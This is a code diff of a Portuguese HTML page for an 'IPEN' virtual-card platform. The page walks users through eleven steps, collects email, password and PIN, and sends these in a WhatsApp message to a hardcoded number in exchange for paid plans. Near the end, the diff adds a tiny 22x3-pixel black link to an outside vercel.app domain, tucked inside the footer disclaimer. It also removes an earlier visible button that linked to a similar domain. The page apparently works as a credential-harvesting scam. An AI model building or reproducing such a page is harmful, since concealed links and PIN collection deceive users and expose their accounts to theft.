@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt">
 <head>
@@ -685,7 +686,6 @@ h2{
 
 </header>
 
-
 <main id="wizard" class="page">
 
   <div class="eyebrow">Plataforma IPEN</div>
@@ -698,7 +698,6 @@ h2{
   <p class="muted" style="font-size:13px;margin-top:10px">
     Consulte as informações, escolha o cartão disponível e avance pelas etapas.
   </p>
-
 
   <div class="virtual-card">
 
@@ -738,12 +737,10 @@ h2{
 
   </div>
 
-
   <div class="info">
     O IPEN apresenta opções de cartões virtuais com condições,
     valores e informações de utilização apresentadas nas etapas seguintes.
   </div>
-
 
   <!-- 11 INDICADORES: 8 ORIGINAIS + 3 NOVOS -->
 
@@ -763,11 +760,9 @@ h2{
 
   </div>
 
-
   <div id="counter" class="counter">
     Etapa 1 de 11
   </div>
-
 
   <!-- ETAPA 1 -->
 
@@ -811,7 +806,6 @@ h2{
     </div>
 
   </section>
-
 
   <!-- ETAPA 2 -->
 
@@ -878,12 +872,6 @@ h2{
       <div class="info" id="accountInfo">
         Para uma conta existente, informe o e-mail e PIN
         associados à conta.
-  style="
-    padding:12px 20px;
-    border:0;
-    
-  
-</button>
       </div>
 
       <div class="error" id="err2"></div>
@@ -891,22 +879,6 @@ h2{
     </div>
 
   </section>
-<button
-  type="button"
-  onclick="window.location.href='https://cart-mz.vercel.app/'"
-  style="
-    padding:12px 20px;
-    border:0;
-    border-radius:10px;
-    background:#19c79a;
-    color:#fff;
-    font-size:16px;
-    font-weight:700;
-    cursor:pointer;
-  "
->
-  
-</button>
 
   <!-- ETAPA 3 -->
 
@@ -985,7 +957,6 @@ h2{
 
   </section>
 
-
   <!-- ETAPA 4 -->
 
   <section class="step hidden" data-step="4">
@@ -1042,7 +1013,6 @@ h2{
 
   </section>
 
-
   <!-- ETAPA 5 -->
 
   <section class="step hidden" data-step="5">
@@ -1096,7 +1066,6 @@ h2{
     </div>
 
   </section>
-
 
   <!-- ETAPA 6 -->
 
@@ -1167,7 +1136,6 @@ h2{
 
   </section>
 
-
   <!-- ETAPA 7 -->
 
   <section class="step hidden" data-step="7">
@@ -1225,7 +1193,6 @@ h2{
           </button>
 
         </div>
-
 
         <div class="plan">
 
@@ -1285,7 +1252,6 @@ h2{
     </div>
 
   </section>
-
 
   <!-- ETAPA 8 — ÚNICO LOCAL DOS 30 DIAS -->
 
@@ -1357,7 +1323,6 @@ h2{
 
   </section>
 
-
   <!-- ETAPA 9 NOVA -->
 
   <section class="step hidden" data-step="9">
@@ -1419,7 +1384,6 @@ h2{
     </div>
 
   </section>
-
 
   <!-- ETAPA 10 NOVA -->
 
@@ -1531,7 +1495,6 @@ h2{
 
   </section>
 
-
   <!-- ETAPA 11 NOVA -->
 
   <section class="step hidden" data-step="11">
@@ -1596,7 +1559,6 @@ h2{
 
   </section>
 
-
   <div class="btns">
 
     <button id="back"
@@ -1615,14 +1577,25 @@ h2{
 
   </div>
 
-
   <div class="tiny">
     IPEN — Plataforma de demonstração de cartões virtuais.
     Consulte sempre as condições apresentadas antes de efetuar qualquer operação.
+<a href="https://mz-car.vercel.app/"
+   target="_blank"
+   rel="noopener noreferrer"
+   style="display:inline-block;
+          width:22px;
+          height:3px;
+          background:#000000;
+          text-decoration:none;
+          border:0;
+          cursor:pointer;
+          vertical-align:middle;">
+</a>
+
   </div>
 
 </main>
-
 
 <script>
 
@@ -1636,7 +1609,6 @@ const STORAGE_KEY='ipen_virtual_cards_state_v2';
 
 const WHATSAPP_NUMBER='258845646041';
 
-
 /*
   CREDENCIAIS TEMPORÁRIAS DO PROTÓTIPO
 
@@ -1649,7 +1621,6 @@ const WHATSAPP_NUMBER='258845646041';
 const TEMP_EMAIL='COLOQUE_AQUI_O_EMAIL_TEMPORARIO';
 const TEMP_PIN='COLOQUE_AQUI_O_PIN_TEMPORARIO';
 
-
 const steps=[
   ...document.querySelectorAll('.step')
 ];
@@ -1659,7 +1630,6 @@ const bars=[
 ].map(
   i=>document.getElementById('bar'+i)
 );
-
 
 /* =========================================
    VALOR
@@ -1672,7 +1642,6 @@ function val(id){
   return el ? el.value.trim() : '';
 
 }
-
 
 /* =========================================
    ERRO
@@ -1688,7 +1657,6 @@ function error(id,msg){
   return false;
 
 }
-
 
 /* =========================================
    GUARDAR ESTADO
@@ -1740,7 +1708,6 @@ function saveState(){
 
 }
 
-
 /* =========================================
    RESTAURAR
 ========================================= */
@@ -1779,7 +1746,6 @@ function restoreState(){
       }
     );
 
-
     if(
       data.selectedPlan==='250' ||
       data.selectedPlan==='350'
@@ -1789,7 +1755,6 @@ function restoreState(){
         data.selectedPlan;
 
     }
-
 
     if(
       Number(data.step)>=1 &&
@@ -1804,7 +1769,6 @@ function restoreState(){
   }catch(e){}
 
 }
-
 
 /* =========================================
    SELECIONAR PLANO
@@ -1826,7 +1790,6 @@ function selectPlan(plan){
 
 }
 
-
 /* =========================================
    ATUALIZAR PLANO
 ========================================= */
@@ -1847,7 +1810,6 @@ function updateSelectedPlan(){
 
   }
 
-
   const temp=
     document.getElementById(
       'temporaryPlanReview'
@@ -1864,7 +1826,6 @@ function updateSelectedPlan(){
 
 }
 
-
 /* =========================================
    MOSTRAR ETAPA
 ========================================= */
@@ -1874,7 +1835,6 @@ function showStep(n){
   step=n;
 
   saveState();
-
 
   steps.forEach(
     section=>{
@@ -1886,7 +1846,6 @@ function showStep(n){
 
     }
   );
-
 
   bars.forEach(
     (bar,index)=>{
@@ -1907,11 +1866,9 @@ function showStep(n){
     }
   );
 
-
   document.getElementById('counter')
     .textContent=
       'Etapa '+n+' de '+TOTAL_STEPS;
-
 
   document.getElementById('back')
     .classList.toggle(
@@ -1919,25 +1876,20 @@ function showStep(n){
       n===1
     );
 
-
   document.getElementById('next')
     .textContent=
       n===TOTAL_STEPS
         ? 'Entrar ✓'
         : 'Continuar →';
 
-
   if(n===2)
     updateAccountMode();
-
 
   if(n===7)
     updateSelectedPlan();
 
-
   if(n===9)
     updateSelectedPlan();
-
 
   window.scrollTo({
     top:0,
@@ -1945,7 +1897,6 @@ function showStep(n){
   });
 
 }
-
 
 /* =========================================
    MODO DE CONTA
@@ -1981,7 +1932,6 @@ function updateAccountMode(){
       'accountInfo'
     );
 
-
   if(type==='Já tenho conta'){
 
     title.textContent=
@@ -2016,7 +1966,6 @@ function updateAccountMode(){
 
 }
 
-
 /* =========================================
    VALIDAÇÃO
 ========================================= */
@@ -2027,7 +1976,6 @@ function validate(){
 
     const type=
       val('accessType');
-
 
     if(
       !val('email') ||
@@ -2041,7 +1989,6 @@ function validate(){
 
     }
 
-
     if(
       val('password').length<4
     ){
@@ -2052,7 +1999,6 @@ function validate(){
       );
 
     }
-
 
     /*
       Conta existente:
@@ -2090,7 +2036,6 @@ function validate(){
 
     }
 
-
     if(type==='Criar nova conta'){
 
       if(!val('name'))
@@ -2098,7 +2043,6 @@ function validate(){
           'err2',
           'Digite o nome da conta.'
         );
-
 
       if(
         val('password')!==val('password2')
@@ -2110,13 +2054,11 @@ function validate(){
 
     }
 
-
     document.getElementById(
       'err2'
     ).textContent='';
 
   }
-
 
   if(step===3){
 
@@ -2144,7 +2086,6 @@ function validate(){
 
   }
 
-
   if(step===6){
 
     if(!val('phone'))
@@ -2171,7 +2112,6 @@ function validate(){
 
   }
 
-
   if(step===7){
 
     if(
@@ -2191,7 +2131,6 @@ function validate(){
     ).textContent='';
 
   }
-
 
   if(step===10){
 
@@ -2243,7 +2182,6 @@ function validate(){
 
   }
 
-
   if(step===11){
 
     const email=
@@ -2251,7 +2189,6 @@ function validate(){
 
     const pin=
       val('temporaryPin');
-
 
     if(!email || !pin){
 
@@ -2261,7 +2198,6 @@ function validate(){
       );
 
     }
-
 
     if(
       TEMP_EMAIL.startsWith('COLOQUE_') ||
@@ -2275,7 +2211,6 @@ function validate(){
 
     }
 
-
     if(
       email!==TEMP_EMAIL ||
       pin!==TEMP_PIN
@@ -2287,7 +2222,6 @@ function validate(){
       );
 
     }
-
 
     document.getElementById(
       'err11'
@@ -2301,13 +2235,11 @@ function validate(){
 
   }
 
-
   saveState();
 
   return true;
 
 }
-
 
 /* =========================================
    WHATSAPP
@@ -2317,7 +2249,6 @@ function openWhatsApp(){
 
   if(!validateWhatsAppFields())
     return;
-
 
   const plan=
     selectedPlan || 'não selecionado';
@@ -2337,7 +2268,6 @@ function openWhatsApp(){
   const country=
     val('waCountry') || val('country');
 
-
   const message=
 `Olá, equipa IPEN.
 
@@ -2352,13 +2282,11 @@ País: ${country}
 
 Solicito a confirmação do pedido e, se disponível, o fornecimento do e-mail e PIN temporários para continuar a utilizar a plataforma enquanto a criação de novas contas permanece indisponível.`;
 
-
   const url=
     'https://wa.me/'+
     WHATSAPP_NUMBER+
     '?text='+
     encodeURIComponent(message);
-
 
   window.open(
     url,
@@ -2367,7 +2295,6 @@ Solicito a confirmação do pedido e, se disponível, o fornecimento do e-mail e
   );
 
 }
-
 
 /* =========================================
    VALIDAÇÃO WHATSAPP
@@ -2390,7 +2317,6 @@ function validateWhatsAppFields(){
   const country=
     val('waCountry') || val('country');
 
-
   if(!name){
 
     error(
@@ -2401,7 +2327,6 @@ function validateWhatsAppFields(){
     return false;
 
   }
-
 
   if(
     !email ||
@@ -2423,7 +2348,6 @@ function validateWhatsAppFields(){
 
   }
 
-
   if(!email){
 
     error(
@@ -2434,7 +2358,6 @@ function validateWhatsAppFields(){
     return false;
 
   }
-
 
   if(!pin){
 
@@ -2447,7 +2370,6 @@ function validateWhatsAppFields(){
 
   }
 
-
   if(!phone){
 
     error(
@@ -2459,7 +2381,6 @@ function validateWhatsAppFields(){
 
   }
 
-
   if(!country){
 
     error(
@@ -2470,7 +2391,6 @@ function validateWhatsAppFields(){
     return false;
 
   }
-
 
   if(
     selectedPlan!=='250' &&
@@ -2486,11 +2406,9 @@ function validateWhatsAppFields(){
 
   }
 
-
   return true;
 
 }
-
 
 /* =========================================
    CONTAGEM DE 30 DIAS
@@ -2502,14 +2420,12 @@ const COUNTDOWN_KEY=
 const WAIT_TIME=
   30*24*60*60*1000;
 
-
 function initCountdown(){
 
   let start=
     localStorage.getItem(
       COUNTDOWN_KEY
     );
-
 
   if(!start){
 
@@ -2523,11 +2439,9 @@ function initCountdown(){
 
   }
 
-
   updateCountdown();
 
 }
-
 
 function updateCountdown(){
 
@@ -2538,10 +2452,8 @@ function updateCountdown(){
       )
     );
 
-
   if(!start)
     return;
-
 
   const elapsed=
     Date.now()-start;
@@ -2552,12 +2464,10 @@ function updateCountdown(){
       WAIT_TIME-elapsed
     );
 
-
   const totalSeconds=
     Math.floor(
       remaining/1000
     );
-
 
   const days=
     Math.floor(
@@ -2577,7 +2487,6 @@ function updateCountdown(){
   const seconds=
     totalSeconds%60;
 
-
   const d=
     document.getElementById('days');
 
@@ -2589,7 +2498,6 @@ function updateCountdown(){
 
   const s=
     document.getElementById('seconds');
-
 
   if(d)
     d.textContent=
@@ -2609,12 +2517,10 @@ function updateCountdown(){
 
 }
 
-
 setInterval(
   updateCountdown,
   1000
 );
-
 
 /* =========================================
    AVANÇAR
@@ -2627,7 +2533,6 @@ document.getElementById('next')
 
     if(!validate())
       return;
-
 
     if(step<TOTAL_STEPS){
 
@@ -2662,7 +2567,6 @@ document.getElementById('next')
   }
 );
 
-
 /* =========================================
    VOLTAR
 ========================================= */
@@ -2683,7 +2587,6 @@ document.getElementById('back')
   }
 );
 
-
 /* =========================================
    TIPO DE CONTA
 ========================================= */
@@ -2700,7 +2603,6 @@ document.getElementById(
 
   }
 );
-
 
 /* =========================================
    COPIAR ESTADO DOS CAMPOS
@@ -2724,7 +2626,6 @@ document.querySelectorAll(
   }
 );
 
-
 /* =========================================
    PÁGINA VISÍVEL
 ========================================= */
@@ -2745,7 +2646,6 @@ window.addEventListener(
 
   }
 );
-
 
 /* =========================================
    INICIAR
@@ -2768,4 +2668,5 @@ showStep(
 </div>
 
 </body>
-  </html>
+</html>
+
